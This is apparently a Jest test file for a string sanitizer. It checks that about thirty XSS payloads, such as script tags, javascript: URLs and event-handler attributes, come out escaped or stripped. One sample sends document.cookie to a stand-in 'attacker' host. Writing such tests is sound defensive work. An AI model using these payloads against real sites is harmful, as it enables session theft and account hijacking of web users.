import { strSanitizer } from '..';

type Sample = {
  [key: string]: string;
};

const sample: Sample = {
  emptyString: '',
  script: '<script>alert("xss")</script>',
  script2: `<script>window.location='http://attacker/?cookie='+document.cookie</script>`,
  link: '<link rel="stylesheet" href="#">',
  img: '<img src="javascript:alert(\'xss\')">',
  input: '<input type="text" value="xss">',
  button: '<button>xss</button>',
  form: '<form action="javascript:alert(\'xss\')">',
  iframe: '<iframe src="javascript:alert(\'xss\')"></iframe>',
  style: '<style>*{color:red}</style>',
  svg: '<svg><script>alert("xss")</script></svg>',
  html: '<html><script>alert("xss")</script></html>',
  body: '<body><script>alert("xss")</script></body>',
  body2: '<body onload=alert(‘something’)>;',
  a: '<a href="javascript:alert(\'xss\')">xss</a>',
  background:
    '<div style="background:url(javascript:alert(\'xss\'))">xss</div>',
  video: '<video><source src="javascript:alert(\'xss\')">xss</video>',
  audio: '<audio><source src="javascript:alert(\'xss\')">xss</audio>',
  object: '<object data="javascript:alert(\'xss\')">xss</object>',
  embed: '<embed src="javascript:alert(\'xss\')">xss</embed>',
  applet: '<applet code="javascript:alert(\'xss\')">xss</applet>',
  meta: '<meta http-equiv="refresh" content="0;url=javascript:alert(\'xss\')">',
  frame: '<frame src="javascript:alert(\'xss\')">xss</frame>',
  frameset: '<frameset onload="alert(\'xss\')">xss</frameset>',
  marquee:
    '<marquee behavior="alternate" direction="right" onscroll="alert(\'xss\')">xss</marquee>',
  table: '<table background="javascript:alert(\'xss\')">xss</table>',
  tbody: '<tbody onload="alert(\'xss\')">xss</tbody>',
  thead: '<thead onload="alert(\'xss\')">xss</thead>',
  tfoot: '<tfoot onload="alert(\'xss\')">xss</tfoot>',
  tr: '<tr onload="alert(\'xss\')">xss</tr>',
  td: '<td onload="alert(\'xss\')">xss</td>',
  th: '<th onload="alert(\'xss\')">xss</th>',
  b: '<b onmouseover=alert(‘XSS testing!‘)></b>'
};

describe('sanitizer', () => {
  test('Should return a empty string when value is a empty string', () => {
    expect(strSanitizer(sample.emptyString)).toBe('');
  });

  test('Should return a empty string when value is undefined', () => {
    expect(strSanitizer(sample.undefinedValue)).toBe('');
  });

  test('Should escape <script> 01', () => {
    expect(strSanitizer(sample.script)).toBe(
      '&lt;script&gt;alert("xss")&lt;/script&gt;'
    );
  });

  test('Should escape <script> option 02', () => {
    expect(strSanitizer(sample.script2)).toBe(
      "&lt;script&gt;window.location='http://attacker/?cookie='+document.cookie&lt;/script&gt;"
    );
  });

  test('Should escape <link>', () => {
    expect(strSanitizer(sample.link)).toBe(
      '&lt;link rel="stylesheet" href="#"&gt;'
    );
  });

  test('Should escape <img>', () => {
    expect(strSanitizer(sample.img)).toBe(
      '&lt;img src="javascript:alert(\'xss\')"&gt;'
    );
  });

  test('Should escape <input>', () => {
    expect(strSanitizer(sample.input)).toBe(
      '&lt;input type="text" value="xss"&gt;'
    );
  });

  test('Should escape <button>', () => {
    expect(strSanitizer(sample.button)).toBe(
      '&lt;button&gt;xss&lt;/button&gt;'
    );
  });

  test('Should escape <form>', () => {
    expect(strSanitizer(sample.form)).toBe(
      '&lt;form action="javascript:alert(\'xss\')"&gt;'
    );
  });

  test('Should escape <iframe>', () => {
    expect(strSanitizer(sample.iframe)).toBe(
      '&lt;iframe src="javascript:alert(\'xss\')"&gt;&lt;/iframe&gt;'
    );
  });

  test('Should escape <style>', () => {
    expect(strSanitizer(sample.style)).toBe(
      '&lt;style&gt;*{color:red}&lt;/style&gt;'
    );
  });

  test('Should escape <svg>', () => {
    expect(strSanitizer(sample.svg)).toBe(
      '&lt;svg&gt;&lt;script&gt;alert("xss")&lt;/script&gt;&lt;/svg&gt;'
    );
  });

  test('Should escape <html>', () => {
    expect(strSanitizer(sample.html)).toBe(
      '&lt;html&gt;&lt;script&gt;alert("xss")&lt;/script&gt;&lt;/html&gt;'
    );
  });

  test('Should escape <body>', () => {
    expect(strSanitizer(sample.body)).toBe(
      '&lt;body&gt;&lt;script&gt;alert("xss")&lt;/script&gt;&lt;/body&gt;'
    );
  });

  test('Should escape <body2>', () => {
    expect(strSanitizer(sample.body2)).toBe(
      '&lt;body onload=alert(‘something’)&gt;;'
    );
  });

  test('Should escape <a>', () => {
    expect(strSanitizer(sample.a)).toBe(
      '&lt;a href="javascript:alert(\'xss\')"&gt;xss&lt;/a&gt;'
    );
  });

  test('Should escape <background>', () => {
    expect(strSanitizer(sample.background)).toBe('<div>xss</div>');
  });

  test('Should escape <video>', () => {
    expect(strSanitizer(sample.video)).toBe(
      '&lt;video&gt;&lt;source src="javascript:alert(\'xss\')"&gt;xss&lt;/video&gt;'
    );
  });

  test('Should escape <audio>', () => {
    expect(strSanitizer(sample.audio)).toBe(
      '&lt;audio&gt;&lt;source src="javascript:alert(\'xss\')"&gt;xss&lt;/audio&gt;'
    );
  });

  test('Should escape <object>', () => {
    expect(strSanitizer(sample.object)).toBe(
      '&lt;object data="javascript:alert(\'xss\')"&gt;xss&lt;/object&gt;'
    );
  });

  test('Should escape <embed>', () => {
    expect(strSanitizer(sample.embed)).toBe(
      '&lt;embed src="javascript:alert(\'xss\')"&gt;xss&lt;/embed&gt;'
    );
  });

  test('Should escape <applet>', () => {
    expect(strSanitizer(sample.applet)).toBe(
      '&lt;applet code="javascript:alert(\'xss\')"&gt;xss&lt;/applet&gt;'
    );
  });

  test('Should escape <meta>', () => {
    expect(strSanitizer(sample.meta)).toBe(
      '&lt;meta http-equiv="refresh" content="0;url=javascript:alert(\'xss\')"&gt;'
    );
  });

  test('Should escape <frame>', () => {
    expect(strSanitizer(sample.frame)).toBe(
      '&lt;frame src="javascript:alert(\'xss\')"&gt;xss&lt;/frame&gt;'
    );
  });

  test('Should escape <frameset>', () => {
    expect(strSanitizer(sample.frameset)).toBe(
      '&lt;frameset onload="alert(\'xss\')"&gt;xss&lt;/frameset&gt;'
    );
  });

  test('Should escape <marquee>', () => {
    expect(strSanitizer(sample.marquee)).toBe(
      '&lt;marquee behavior="alternate" direction="right" onscroll="alert(\'xss\')"&gt;xss&lt;/marquee&gt;'
    );
  });

  test('Should escape <table>', () => {
    expect(strSanitizer(sample.table)).toBe('<table>xss</table>');
  });

  test('Should escape <tbody>', () => {
    expect(strSanitizer(sample.tbody)).toBe('<tbody>xss</tbody>');
  });

  test('Should escape <thead>', () => {
    expect(strSanitizer(sample.thead)).toBe('<thead>xss</thead>');
  });

  test('Should escape <tfoot>', () => {
    expect(strSanitizer(sample.tfoot)).toBe(
      '&lt;tfoot onload="alert(\'xss\')"&gt;xss&lt;/tfoot&gt;'
    );
  });

  test('Should escape <tr>', () => {
    expect(strSanitizer(sample.tr)).toBe('<tr>xss</tr>');
  });

  test('Should escape <td>', () => {
    expect(strSanitizer(sample.td)).toBe('<td>xss</td>');
  });

  test('Should escape <th>', () => {
    expect(strSanitizer(sample.th)).toBe('<th>xss</th>');
  });

  test('Should escape <b>', () => {
    expect(strSanitizer(sample.b)).toBe('<b></b>');
  });
});
